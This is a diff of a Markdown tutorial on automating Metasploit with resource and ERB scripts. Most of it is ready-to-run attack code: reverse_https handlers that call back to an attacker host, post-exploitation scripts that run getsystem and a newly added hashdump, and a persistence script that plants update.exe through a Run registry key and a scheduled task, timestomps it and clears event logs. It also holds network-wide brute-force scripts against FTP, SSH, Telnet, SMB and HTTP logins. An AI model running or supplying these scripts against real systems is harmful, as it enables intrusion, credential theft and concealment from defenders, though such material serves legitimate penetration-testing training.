@@ -1,6 +1,6 @@
 ## METASPLOIT RESOURCE FILES
 
-<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>
+<blockquote>Resource scripts provides an easy way for us to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts, they contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands or by directly embedding Ruby to do things like call APIs, interact with objects in the database, interact with modules and iterate actions.</blockquote>
 
 ![pic](http://i68.tinypic.com/21ovkfm.jpg)
 
@@ -22,7 +22,6 @@
 - [Meterpreter Core Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
 - [My Metasploit API Cheat Sheet](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md)
 - [Rapid7 automating the metasploit console](https://blog.rapid7.com/2010/03/22/automating-the-metasploit-console/)
-- [Offensiveinfosec Writing Resource Scripts](https://offensiveinfosec.wordpress.com/2012/04/08/writing-resource-scripts-for-the-metasploit-framework/)
 - [INURLBR - metasploit automatizacao resource files](http://blog.inurl.com.br/2015/02/metasploit-automatizacao-resource-files_23.html)
 
 ---
@@ -30,9 +29,11 @@
 <br /><br /><br />
 
 ## WHAT ARE RESOURCE FILES
-The Metasploit Console (msfconsole) has supported the concept of resource files for quite some time. A resource file is essentially a batch script for Metasploit; using these files you can automate common tasks. If you create a resource script called ~/.msf4/msfconsole.rc, it will automatically load each time you start the msfconsole interface. This is a great way to automatically connect to a database and set common parameters (setg PAYLOAD, setg RHOSTS, etc). As of revision r8876, blocks of Ruby code can now be directly inserted into the resource scripts. This turns resource scripts into a generic automation platform for the Metasploit Framework.
+The Metasploit Console (msfconsole) has supported the concept of resource files for quite some time. A resource file is essentially a batch script for Metasploit using these files you can automate common tasks. If you create a resource script called ~/.msf4/msfconsole.rc, it will automatically load each time you start the msfconsole interface. This is a great way to automatically connect to a database and set common parameters (setg PAYLOAD, setg RHOSTS, etc) As of revision r8876, blocks of Ruby code (ERB) can now be directly inserted into the resource script. This turns resource scripts into a generic automation platform for the Metasploit Framework.
 
-WARNING: Before you can run a resource script, you need to identify the required parameters that need to be configured<br />for the script/auxiliary/exploit to run. Also remmenber to start postgresql service before interacting with metasploit.
+The 'resource' command will execute msfconsole/meterpreter instructions located inside a text file containing one entry per line. 'resource' will execute each line in sequence. This can help automate repetitive actions performed by an user. By default the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).
+
+WARNING: Before we can run a resource script, we need to identify the required parameters that need to be configured<br />for the script/auxiliary/exploit to run. Also remmenber to start postgresql service before interacting with metasploit console.
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
@@ -41,18 +42,18 @@ WARNING: Before you can run a resource script, you need to identify the required
 <br /><br /><br />
 
 ##  HOW TO RUN RESOURCE SCRIPTS?
-<blockquote>You can run resource scripts from msfconsole or from the web interface. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag (making msfconsole execute the resource script at startup).</blockquote>
+<blockquote>You can run resource scripts from msfconsole or from the web interface. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the 'resource' command or you can run a resource script when you start msfconsole using the msfconsole -r flag (making msfconsole execute the resource script at startup).</blockquote>
 
 
-To run resource script(s) at **msfconsole startup** execute the follow command in your terminal:
+To run resource script at **msfconsole startup** execute the follow command in your terminal:
 
       msfconsole -r /root/script.rc
 
-To run resource script(s) **inside msfconsole** execute the follow command in msfconsole:
+To run resource script **inside msfconsole** execute the follow command in msfconsole:
 
       resource /root/script.rc
 
-To run resource script(s) **inside meterpreter** execute the follow command in meterpreter:
+To run resource script **inside meterpreter** execute the follow command in meterpreter:
 
       resource /root/script.rc
 
@@ -63,25 +64,24 @@ To run resource script(s) **inside meterpreter** execute the follow command in m
 <br /><br /><br />
 
 ## HOW TO WRITE RESOURCE SCRIPTS?
-<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. Personally i recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands into a file, which can be used with the resource command.</blockquote>
-
+<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. Personally i recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands into a file, which can be used with the 'resource' command.</blockquote>
 
 Open your text editor and copy/past the follow two metasploit core commands to it, save file and name it as: **version.rc**
 ```
   version
   exit -y
 ```
-**run the script:** msfconsole -r /root/version.rc
+**[terminal]::run the script::** msfconsole -r /root/version.rc
 
 <br />
 
-The next example show us how to use msfconsole makerc core command to write our resource script.
+The next example show us how to use msfconsole 'makerc' core command to write our resource script.
 ```
    kali > msfconsole
    msf > version
    msf > makerc /root/version.rc
 ```
-**Run the script:** resource /root/version.rc
+**[msfconsole]::Run the script::** resource /root/version.rc
 
 <br /><br />
 
@@ -96,7 +96,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    set LPORT 666
    exploit
 ```
-**Run the script:** msfconsole -r /root/handler.rc
+**[terminal]::Run the script::** msfconsole -r /root/handler.rc
 
 <br />
 
@@ -111,12 +111,11 @@ The next example show us how to use msfconsole makerc core command to write our 
    msf exploit(multi/handler) > exploit
    msf exploit(multi/handler) > makerc /root/handler.rc
 ```
-**Run the script:** resource /root/handler.rc
+**[msfconsole]::Run the script::** resource /root/handler.rc
 
 <br /><br />
 
 <blockquote>The next resource script allow us to record msfconsole activity under logfile.log and commands.rc<br />It also displays database information sutch as: framework version, active sessions in verbose mode, loads my auxiliary scripts local directory into msfdb (loading my modules) and executes the rc script handler.rc at msfconsole startup.</blockquote>
-
 
 Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **record.rc**
 ```
@@ -127,11 +126,9 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    resource /root/handler.rc
    makerc /root/commands.rc
 ```
-**Run the script:** msfconsole -r /root/record.rc
+**[terminal]::Run the script::** msfconsole -r /root/record.rc
 
 ![gif](http://i68.tinypic.com/343oefb.gif)
-
-<blockquote>Final Note: Resource Files give us the ability to execute sequentially metasploit core commands, so if we read metasploit core commands list... we have many combinations that we can use in resource files scripting.</blockquote>
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
@@ -146,6 +143,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
 ```
    getprivs
    getsystem
+   hashdump
    screenshot
    webcan_snap -v false
    migrate -n wininit.exe
@@ -154,7 +152,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
      use post/multi/recon/local_exploit_suggester
    run
 ```
-**Run the script:** resource /root/post.rc
+**[meterpreter]::Run the script::** resource /root/post.rc
 
 <br /><br />
 
@@ -165,22 +163,22 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
  getprivs
  getsystem
  migrate -n explorer.exe
-  upload update.exe %temp%\\update.exe
+  upload /root/update.exe %temp%\\update.exe
   timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
   reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
   scheduleme -m 10 -c "%temp%\\update.exe"
  clearev
 ```
-**Run the script:** resource /root/persistence.rc
+**[meterpreter]::Run the script::** resource /root/persistence.rc
 
 <br /><br />
 
-<blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using SETG (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>
+<blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using 'SETG' (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will then run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>
 
 Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **http_brute.rc**
 ```
    setg THREADS 15
-   setg RHOSTS 192.168.1.254
+   setg RHOSTS 192.168.1.0/24
      use auxiliary/scanner/http/http_version
    run
      use auxiliary/scanner/http/dir_scanner
@@ -189,7 +187,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    run
    unsetg RHOSTS THREADS
 ```
-**Run the script:** msfconsole -r /root/http_brute.rc
+**[meterpreter]::Run the script::** resource /root/http_brute.rc
 
 ![gif](http://i66.tinypic.com/2usid92.gif)
 
@@ -215,20 +213,20 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
 Open your text editor and copy/past the follow metasploit commands to it, save file and name it as: **post_handler.rc**
 ```
    setg RESOURCE /root/gather.rc
-      use exploit/multi/handler
-      set AutoRunScript post/multi/gather/multi_command
-      set PAYLOAD windows/meterpreter/reverse_https
-      set ExitOnSession false
-      set LHOST 192.168.1.71
-      set LPORT 666
+    use exploit/multi/handler
+    set AutoRunScript post/multi/gather/multi_command
+    set PAYLOAD windows/meterpreter/reverse_https
+    set ExitOnSession false
+    set LHOST 192.168.1.71
+    set LPORT 666
    exploit
    unsetg RESOURCE
 ```
-**Run the script:** msfconsole -r /root/post_handler.rc
+**[terminal]::Run the script::** msfconsole -r /root/post_handler.rc
 
 <br /><br />
 
-- **Handler::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
+- **[Handler]::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
 <blockquote>The easy way to reproduce this is: execute one multi/handler with the 'AutoRunScript' flag executing @darkoperator 'multi_console_command' script with the -rc argument pointing to the absoluct path of our gather.rc script. That will execute our gather.rc (auto-running our resource script automatically at session creation).</blockquote>
 
       sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'
@@ -244,7 +242,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
 <br /><br /><br />
 
 ## USING RUBY IN RC (ERB scripting)
-<blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>
+<blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit API calls.</blockquote>
 
 Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **template.rc**
 ```
@@ -270,20 +268,17 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
        print_good("checking database hosts")
        Rex::sleep(2)
        run_single("hosts")
-       print_good("checking database workspace")
-       Rex::sleep(2)
-       run_single("workspace -v")
 
     print_warning("exporting database to: template.xml")
     Rex::sleep(1.5)
     run_single("db_export -f xml template.xml")
 </ruby>
 ```
-**Run the script:** msfconsole -r /root/template.rc
+**[terminal]::Run the script:** msfconsole -r /root/template.rc
 
 <br /><br />
 
-<blockquote>The next resource script uses db_nmap metasploit core command to populate the msfdb database with hosts (address), then the ruby function will check what hosts has been capture and run 3 post-exploitation modules againts all hosts that are stored inside the msfdb database (db_nmap scan: 192.168.1.0/24).</blockquote>
+<blockquote>The next resource script uses 'db_nmap' metasploit core command to populate the msf database with hosts (address), then the ruby function will check what hosts has been capture and run 3 post-exploitation modules againts all hosts that are stored inside the msf database (db_nmap scan used: 192.168.1.0/24).</blockquote>
 
 Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **http_recon.rc**
 ```
@@ -292,7 +287,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
        Description:
          This Metasploit RC file can be used to automate the exploitation process.
          In this example we are using db_nmap to populate msfdb database with hosts
-         then trigger auxiliary/http/scanner modules againts all hosts inside db.
+         then it triggers auxiliary/http/scanner modules againts all hosts inside db.
 
        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
@@ -304,22 +299,26 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
      run_single("services")
      xhost = framework.db.hosts.map(&:address).join(' ')
            run_single("setg RHOSTS #{xhost}")
+           print_status("Runing auxiliary modules.")
            run_single("use auxiliary/scanner/http/title")
            run_single("exploit")
            run_single("use auxiliary/scanner/http/dir_scanner")
            run_single("exploit")
            run_single("use auxiliary/scanner/http/http_login")
            run_single("exploit")
+     print_warning("Please wait, cleaning recent configurations..")
      run_single("unsetg RHOSTS")
      run_single("services -d")
      run_single("hosts -d")
    </ruby>
 ```
-**Run the script:** msfconsole -r /root/http_recon.rc
+**[terminal]::Run the script::** msfconsole -r /root/http_recon.rc
 
 <br /><br />
 
-<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system. REMARK: This script its prepared to accept user inputs (RHOSTS) and (USERPASS_FILE) throuth the setg global variable declaration, if none value has povided then this resource script will use module default values.</blockquote>
+<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system. REMARK: This script its prepared to accept user inputs (RHOSTS) and (USERPASS_FILE) throuth the 'SETG' global variable declaration, if none value has povided then this resource script will use is own default values.</blockquote>
+
+**setg** In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set you can use them in as many exploits and auxiliary modules as you like to prevent always check auxiliary options before you run or exploit. Conversely, you can use the **unsetg** command to unset a global variable.
 
 Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **brute_force.rc**
 ```
@@ -351,18 +350,18 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
 
       run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445 --script=smb-os-discovery.nse,http-headers.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
       run_single("services")
-      print_good("Reading msfdb database.")
+      print_good("Reading msfdb database for info.")
       xhost = framework.db.hosts.map(&:address).join(' ')
       xport = framework.db.services.map(&:port).join(' ')
       run_single("setg RHOSTS #{xhost}")
 
          if xhost.nil? or xhost == ''
-              print_error("db_nmap did not find any alive connections.")
+              print_error("db_nmap scan did not find any alive connections.")
               print_error("please wait, cleaning recent configurations.")
               run_single("unsetg RHOSTS USERPASS_FILE")
               return nil
          elsif xport.nil? or xport == ''
-              print_error("db_nmap did not find any 21,22,23,80,445 ports open")
+              print_error("db_nmap sdid not find any 21:22:23:110:80:445 open ports.")
               print_error("please wait, cleaning recent configurations.")
               run_single("unsetg RHOSTS USERPASS_FILE")
               run_single("services -d")
@@ -379,6 +378,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("exploit")
               run_single("use auxiliary/scanner/ftp/ftp_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set STOP_ON_SUCCESS true")
               run_single("set BRUTEFORCE_SPEED 4")
               run_single("set THREADS 70")
               run_single("exploit")
@@ -388,8 +388,9 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               print_warning("Remote Target port: 22 ssh found")
               run_single("use auxiliary/scanner/ssh/ssh_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set STOP_ON_SUCCESS true")
               run_single("set VERBOSE true")
-              run_single("set THREADS 26")
+              run_single("set THREADS 30")
               run_single("exploit")
          end
 
@@ -399,6 +400,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("exploit")
               run_single("use auxiliary/scanner/telnet/telnet_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set STOP_ON_SUCCESS true")
               run_single("set THREADS 16")
               run_single("exploit")
          end
@@ -427,6 +429,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("exploit")
               run_single("use auxiliary/scanner/smb/smb_login")
               run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set STOP_ON_SUCCESS true")
               run_single("set THREADS 16")
               run_single("exploit")
          end
@@ -441,6 +444,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("use auxiliary/scanner/http/dir_scanner")
               run_single("exploit")
               run_single("use auxiliary/scanner/http/http_login")
+              run_single("set STOP_ON_SUCCESS true")
               run_single("set THREADS 16")
               run_single("exploit")
          end
@@ -451,11 +455,11 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
      run_single("hosts -d")
    </ruby>
 ```
-**Run the script:** msfconsole -r /root/brute_force.rc
+**[terminal]::Run the script::** msfconsole -r /root/brute_force.rc
 
 <br /><br />
 
-<blockquote>Run auxiliary snmp modules and nmap nse scripts againts sellected setg RHOSTS variable defined in msfconsole. Users just need to manually input target(s) ip address(s) into setg RHOSTS variable to point to the targets to be scanned.</blockquote>
+<blockquote>Run auxiliary snmp modules and nmap nse scripts againts sellected setg RHOSTS variable defined in msfconsole. Users just need to manually input target(s) ip address(s) into 'SETG' RHOSTS variable to point to the targets to be scanned.</blockquote>
 
 Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **snmp_enum.rc**
 ```
@@ -463,8 +467,8 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       help = %Q|
         Description:
           This Metasploit RC file can be used to automate the exploitation process.
-          In this example we are using msfconsole setg to add to msfdb database rhosts
-          then trigger db_nmap nse scripts and msfconsole auxiliary modules againts rhosts.
+          In this example we are using msfconsole setg to add to msfdb database rhost(s)
+          then trigger db_nmap nse scripts and msfconsole auxiliary modules againts rhost(s).
 
         Execute in msfconsole:
           setg RHOSTS <hosts-separated-by-spaces>
@@ -494,12 +498,13 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       run_single("exploit")
       run_single("use auxiliary/scanner/snmp/snmp_enumshares")
       run_single("exploit")
+      print_warning("please wait, Cleaning msfdb Database.")
       run_single("unsetg RHOSTS")
      run_single("services -d")
      run_single("hosts -d")
    </ruby>
 ```
-**Run the script:** msfconsole -r /root/snmp_enum.rc
+**[terminal]::Run the script::** msfconsole -r /root/snmp_enum.rc
 
 <br />
 
@@ -509,7 +514,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
 
 ---
 
-<br /><br /><br />
+<br /><br />
 
 ## Suspicious Shell Activity (Red Team) @2019
 
